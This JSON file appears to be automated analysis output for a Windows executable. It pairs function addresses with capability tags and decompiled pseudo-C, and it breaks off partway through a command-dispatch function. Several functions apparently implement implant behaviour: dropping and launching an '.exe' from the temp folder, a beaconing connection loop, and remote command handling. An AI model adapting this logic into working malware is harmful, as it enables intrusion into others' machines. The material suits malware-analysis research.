{
    "00401032": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.00401032(void)\n\n{\n    *0x41e580 = *0x41e580 * 0x343fd + 0x269ec3;\n    return *0x41e580 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 62
    },
    "00414278": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.00414278(uint16_t *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t in_ECX;\n    uint16_t *puVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        do {\n            uVar1 = *arg_8h;\n            iVar4 = in_EDX + -1;\n            uVar2 = uVar1 >> 0xc;\n            piVar5 = (uVar1 & 0xfff) + in_ECX;\n            puVar3 = arg_8h;\n            if (uVar2 == 3) {\n                *piVar5 = *piVar5 + arg_ch;\n            }\n            else if (uVar2 == 1) {\n                *piVar5 = *piVar5 * 0x10000 + arg_ch >> 0x10;\n            }\n            else if (uVar2 == 4) {\n                puVar3 = arg_8h + 1;\n                iVar4 = in_EDX + -2;\n                if ((uVar1 & 2) == 0) {\n                    uVar1 = *piVar5;\n                    iVar6 = arg_ch + *puVar3 + 0x8000 + uVar1 * 0x10000;\n                    *piVar5 = iVar6 >> 0x10;\n                    uVar7 = iVar6 + uVar1 * -0x10000 >> 0x10;\n                    if (uVar7 - (arg_ch >> 0x10) == 1) {\n                        *arg_8h = *arg_8h | 1;\n                    }\n                    else if (uVar7 != arg_ch >> 0x10) {\n                        *arg_8h = *arg_8h | 2;\n                    }\n                }\n            }\n            else if (uVar2 == 2) {\n                *piVar5 = *piVar5 + arg_ch;\n            }\n            else if (((uVar2 != 0) && (uVar2 != 6)) && (uVar2 != 7)) {\n                if (uVar2 != 0xb) {\n                    return NULL;\n                }\n                puVar3 = arg_8h + 2;\n                uVar7 = *puVar3 * 0x10000;\n                uVar8 = uVar7 + arg_8h[1];\n                uVar9 = uVar8 + arg_ch;\n                *piVar5 = (uVar9 + 0x8000 >> 0x10 |\n                          (((*piVar5 << 0x10) * 0x10000 >> 0x20) + (*puVar3 >> 0x10) + CARRY4(uVar7, arg_8h[1]) +\n                           arg_10h + CARRY4(uVar8, arg_ch) + (0xffff7fff < uVar9)) * 0x10000) + 0x8000 >> 0x10;\n                iVar4 = in_EDX + -3;\n            }\n            arg_8h = puVar3 + 1;\n            in_EDX = iVar4;\n        } while (iVar4 != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 813
    },
    "00415b64": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415b64(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    \n    iVar4 = (in_EDX >> 0x1f & 3U) + in_EDX >> 2;\n    puVar1 = in_ECX + iVar4 * 4;\n    for (iVar4 = -iVar4; iVar4 != 0; iVar4 = iVar4 + 1) {\n        arg_8h = (*(puVar1 + iVar4 * 4) * 0x16a88000 | *(puVar1 + iVar4 * 4) * -0x3361d2af >> 0x11) * 0x1b873593 ^\n                 arg_8h;\n        arg_8h = (arg_8h << 0xd | arg_8h >> 0x13) * 5 + 0xe6546b64;\n    }\n    uVar3 = 0;\n    uVar2 = in_EDX & 3;\n    if (uVar2 != 1) {\n        if (uVar2 != 2) {\n            if (uVar2 != 3) goto code_r0x00415be1;\n            uVar3 = puVar1[2] << 0x10;\n        }\n        uVar3 = uVar3 ^ puVar1[1] << 8;\n    }\n    arg_8h = arg_8h ^ ((*puVar1 ^ uVar3) * 0x16a88000 | (*puVar1 ^ uVar3) * -0x3361d2af >> 0x11) * 0x1b873593;\ncode_r0x00415be1:\n    uVar2 = ((arg_8h ^ in_EDX) >> 0x10 ^ arg_8h ^ in_EDX) * -0x7a143595;\n    uVar2 = (uVar2 >> 0xd ^ uVar2) * -0x3d4d51cb;\n    *arg_ch = uVar2 >> 0x10 ^ uVar2;\n    return;\n}\n",
        "token_count": 514
    },
    "00401098": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint16_t * fcn.00401098(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    \n    if (*param_2 != 0) {\n        iVar1 = *param_1;\n        if (iVar1 != 0) {\n            iVar3 = param_1 - param_2;\n            piVar2 = param_2;\njoined_r0x004010be:\n            do {\n                if (iVar1 != 0) {\n                    if (*piVar2 == 0) {\n                        return param_1;\n                    }\n                    if (*(iVar3 + piVar2) == *piVar2) {\n                        iVar1 = *(iVar3 + piVar2 + 1);\n                        piVar2 = piVar2 + 1;\n                        goto joined_r0x004010be;\n                    }\n                }\n                if (*piVar2 == 0) {\n                    return param_1;\n                }\n                param_1 = param_1 + 1;\n                iVar1 = *param_1;\n                iVar3 = iVar3 + 2;\n                piVar2 = param_2;\n            } while (iVar1 != 0);\n        }\n        param_1 = NULL;\n    }\n    return param_1;\n}\n",
        "token_count": 288
    },
    "0040126d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040126d(uchar *arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    uchar *puVar1;\n    \n    puVar1 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            arg_10h = arg_10h + -1;\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00402727": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402727(int32_t **param_1)\n\n{\n    if ((**param_1 != 0) && (*(param_1 + 1) != '\\0')) {\n        fcn.00401014(**param_1);\n        **param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00402771": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402771(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*param_1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 82
    },
    "0040283b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040283b(uint arg_8h)\n\n{\n    int32_t **in_ECX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar2 = (in_ECX[2] + 1U) * in_ECX[3];\n        var_8h = fcn.00406fa7();\n        if (var_8h == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            *var_8h = piVar2;\n            var_8h = var_8h + 1;\n            piVar3 = var_8h;\n            for (piVar1 = piVar2; piVar1 != NULL; piVar1 = piVar1 + -1) {\n                *piVar3 = 0;\n                piVar3[1] = 0;\n                piVar3[2] = 0;\n                piVar3 = piVar3 + 4;\n            }\n        }\n        piVar3 = NULL;\n        piVar1 = in_ECX[2];\n        if (piVar1 != NULL) {\n            var_ch = 0;\n            do {\n                fcn.00402979(*in_ECX + var_ch);\n                piVar3 = piVar3 + 1;\n                piVar1 = in_ECX[2];\n                var_ch = var_ch + 0x10;\n            } while (piVar3 < piVar1);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401c7a(piVar1);\n        }\n        in_ECX[1] = piVar2;\n        *in_ECX = var_8h;\n    }\n    fcn.00402979(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.004015d4();\n    return;\n}\n",
        "token_count": 465
    },
    "00402a2f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a2f(uint dwMilliseconds)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if (*in_ECX != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*in_ECX, dwMilliseconds);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 115
    },
    "00402a5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a5c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_4h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00406fa7();\n        if (piVar1 == NULL) {\n            piVar1 = NULL;\n        }\n        else {\n            *piVar1 = piVar3;\n            piVar1 = piVar1 + 1;\n            piVar2 = piVar3;\n            piVar4 = piVar1;\n            if (piVar3 != NULL) {\n                for (; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                    *piVar4 = 0;\n                    piVar4 = piVar4 + 1;\n                }\n            }\n        }\n        piVar2 = in_ECX[2];\n        if (piVar2 != NULL) {\n            piVar4 = NULL;\n            do {\n                fcn.004043c7(*in_ECX + piVar4);\n                piVar2 = in_ECX[2];\n                piVar4 = piVar4 + 1;\n            } while (piVar4 < piVar2);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00402b2d(piVar2);\n        }\n        in_ECX[1] = piVar3;\n        *in_ECX = piVar1;\n    }\n    fcn.004043c7(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 426
    },
    "00402f9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402f9a(int32_t *param_1)\n\n{\n    uint unaff_ESI;\n    \n    if (param_1[4] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[4]);\n    }\n    fcn.00406f1d();\n    if (*param_1 != 0) {\n        fcn.00406f66(unaff_ESI);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 112
    },
    "004037e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004037e6(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint *lpBuffer_00;\n    uint arg_ch;\n    uint lpBuffer;\n    uint var_24h;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpString2;\n    \n    lpString2 = 0;\n    fcn.00404656(param_2 + 8);\n    iVar1 = fcn.004045f0();\n    fcn.00406f1d();\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &lpBuffer);\n        uVar2 = fcn.0040460a(&lpBuffer);\n        fcn.004043c7(uVar2);\n        fcn.00406f1d();\n        fcn.00404477(*(param_2 + 4));\n        fcn.004043fa(L\".exe\");\n    }\n    else {\n        fcn.00404656(param_2 + 8);\n        fcn.004043c7(&var_8h);\n        fcn.00406f1d();\n    }\n    if (*(param_2 + 0xc) == 0) {\n        uVar2 = 0;\n        if (lpString2 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n            uVar2 = fcn.00406f2c();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar2, lpString2);\n        }\n        fcn.00413c34(uVar2);\n    }\n    arg_ch = 0;\n    uVar2 = 0;\n    if (lpString2 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n        uVar2 = fcn.00406f2c();\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar2, lpString2);\n    }\n    fcn.00413fdb(uVar2, arg_ch);\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(lpString2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00413f8e(extraout_ECX, extraout_ECX);\n    }\n    else {\n        iVar1 = fcn.00413f4f(0x40000000);\n    }\n    if (iVar1 != 0) {\n        fcn.00404094(param_2 + 0x18);\n        lpBuffer_00 = &var_ch;\n        uVar2 = extraout_ECX_00;\n        fcn.00413ef9(lpBuffer_00);\n        fcn.00404081(lpBuffer_00, uVar2);\n        fcn.00413ee1();\n    }\n    if ((*(param_2 + 0x14) != '\\0') && (*(param_2 + 0xc) == *(param_2 + 0x10))) {\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, L\"open\", lpString2, 0, 0, 5);\n    }\n    fcn.00413c16();\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 746
    },
    "00403a31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403a31(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    param_2 = param_2 + 4;\n    uVar2 = fcn.0040434f(\"start\");\n    iVar3 = fcn.00404333(uVar2);\n    if ((iVar3 == 0) || (*0x41e57c != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.00406f1d();\n    if (bVar1) {\n        fcn.00412b3b(param_1);\n    }\n    else {\n        uVar2 = fcn.0040434f(\"exit\");\n        iVar3 = fcn.00404333(uVar2);\n        fcn.00406f1d();\n        if (iVar3 == 0) {\n            fcn.00404385(param_2);\n            fcn.00412a57(param_2);\n        }\n        else {\n            *0x41e57c = 0;\n            fcn.00412798();\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "004040c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004040c4(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "0040415d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040415d(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.00406f1d();\n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00404302();\n        uVar1 = fcn.00406e8d();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00404302": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404302(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n        return iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "00404314": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404314(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n    return iVar1 * 2 + 2;\n}\n",
        "token_count": 79
    },
    "00404385": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404385(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00404302();\n        uVar1 = fcn.00406f2c();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "004043c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043c7(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.00404314();\n        uVar1 = fcn.00406e8d();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "004045f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004045f0(int32_t *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*param_1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "00404656": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404656(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    if (*arg_8h != 0) {\n        fcn.004045f0();\n        uVar1 = fcn.00406f2c();\n        *in_ECX = uVar1;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar1, *arg_8h);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00404928": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404928(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    *(in_ECX + 4) = **arg_8h;\n    *(in_ECX + 8) = *(*arg_8h + 4) != '\\0';\n    arg_8h_00 = fcn.00403e83(&var_8h, 9, *(*arg_8h + 5));\n    fcn.00403eca(arg_8h_00);\n    fcn.00404081();\n    return;\n}\n",
        "token_count": 143
    },
    "00404dd1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404dd1(int32_t *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = *(*arg_8h + 4);\n    uVar1 = fcn.00415dc4(arg_8h_00);\n    fcn.004043c7(uVar1);\n    fcn.00406f1d();\n    *(in_ECX + 0x10) = *(arg_8h_00 + 8 + *arg_8h);\n    *(in_ECX + 0xc) = *(arg_8h_00 + 0xc + *arg_8h);\n    *(in_ECX + 0x14) = *(arg_8h_00 + 0x10 + *arg_8h) != '\\0';\n    uVar1 = fcn.00403e83(&var_8h, arg_8h_00 + 0x15, *(arg_8h_00 + 0x11 + *arg_8h));\n    fcn.00403eca(uVar1);\n    fcn.00404081();\n    return;\n}\n",
        "token_count": 293
    },
    "00405e61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405e61(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uchar *pNodeName;\n    uint hostshort;\n    uint var_10h;\n    uint var_8h;\n    \n    *(param_1 + 0x248) = 1;\n    do {\n        fcn.00406d2f(&var_10h);\n        fcn.00406d2f(&var_8h);\n        pNodeName = &stack0xffffffcc;\n        hostshort = extraout_ECX;\n        fcn.0040456d(&stack0xffffffcc);\n        iVar1 = fcn.00406871(pNodeName, hostshort);\n        fcn.00406f1d();\n        var_8h = 0;\n        fcn.00406f1d();\n        var_10h = 0;\n        if (iVar1 != 0) {\n            fcn.004066a8(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(*(param_1 + 0x218));\n    } while (*(param_1 + 0x248) != 0);\n    return param_1 + 0x1e4;\n}\n",
        "token_count": 275
    },
    "00405f6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f6c(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t *piVar4;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_8h = in_ECX;\n    if ((*(in_ECX + 0x18) == 0) && (0xb < *(in_ECX + 0x14))) {\n        piVar4 = *(in_ECX + 0x10);\n        if (*piVar4 == -0x1b9944d7) {\n            *(in_ECX + 0x28) = piVar4[1];\n            *(in_ECX + 0x2c) = piVar4[2];\n            *(in_ECX + 0x18) = 1;\n        }\n        else {\n            fcn.00403ffa();\n        }\n    }\n    if (*(in_ECX + 0x18) != 1) {\n        return;\n    }\n    var_10h = *(in_ECX + 0x14) - 0xc;\n    if (var_10h < *(in_ECX + 0x28)) {\n        return;\n    }\n    fcn.00403fc7(*(in_ECX + 0x10) + 0xc, *(in_ECX + 0x28));\n    uVar1 = *(in_ECX + 0x2c);\n    piVar4 = NULL;\n    if (uVar1 < 0x27) {\n        if (uVar1 == 0x26) {\n            piVar4 = fcn.00406fa7();\n            if (piVar4 != NULL) {\n                *piVar4 = 0x419814;\n                goto code_r0x00406531;\n            }\n        }\n        else if (uVar1 < 0x13) {\n            if (uVar1 == 0x12) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x4197bc;\n                    goto code_r0x00406531;\n                }\n            }\n            else if (uVar1 < 9) {\n                if (uVar1 == 8) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x41975c;\ncode_r0x004060b7:\n                        piVar4[2] = 0;\n                        goto code_r0x00406531;\n                    }\n                }\n                else if (uVar1 == 0) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x419774;\n                        goto code_r0x00406531;\n                    }\n                }\n                else if (uVar1 == 2) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x4197b4;\n                        goto code_r0x00406531;\n                    }\n                }\n                else if (uVar1 == 4) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x4197a4;\n                        goto code_r0x00406531;\n                    }\n                }\n                else {\n                    if (uVar1 != 6) goto code_r0x00406539;\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 != NULL) {\n                        *piVar4 = 0x419794;\n                        goto code_r0x0040603f;\n                    }\n                }\n            }\n            else if (uVar1 == 10) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x41974c;\ncode_r0x0040603f:\n                    piVar4[1] = 0;\n                    goto code_r0x00406531;\n                }\n            }\n            else if (uVar1 == 0xc) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x419784;\n                    goto code_r0x00406531;\n                }\n            }\n            else if (uVar1 == 0xe) {\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    *piVar4 = 0x4197f4;\n                    goto code_r0x0040603f;\n                }\n            }\n            else {\n                if (uVar1 != 0x10) goto code_r0x00406539;\n                piVar4 = fcn.00406fa7();\n                if (piVar4 != NULL) {\n                    piVar4[1] = -1;\n                    *piVar4 = 0x419488;\n                    goto code_r0x00406531;\n                }\n            }\n        }\n        else {\n            if (uVar1 < 0x1d) {\n                if (uVar1 == 0x1c) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 == NULL) goto code_r0x0040652f;\n                    *piVar4 = 0x41982c;\n                    piVar4[2] = 0;\n                    piVar4[6] = 0;\n                    piVar4[7] = 0;\n                }\n                else if (uVar1 == 0x14) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 == NULL) goto code_r0x0040652f;\n                    *piVar4 = 0x41980c;\n                }\n                else if (uVar1 == 0x16) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 == NULL) goto code_r0x0040652f;\n                    *piVar4 = 0x41981c;\n                }\n                else if (uVar1 == 0x18) {\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 == NULL) goto code_r0x0040652f;\n                    *piVar4 = 0x4197c4;\n                }\n                else {\n                    if (uVar1 != 0x1a) goto code_r0x00406539;\n                    piVar4 = fcn.00406fa7();\n                    if (piVar4 == NULL) goto 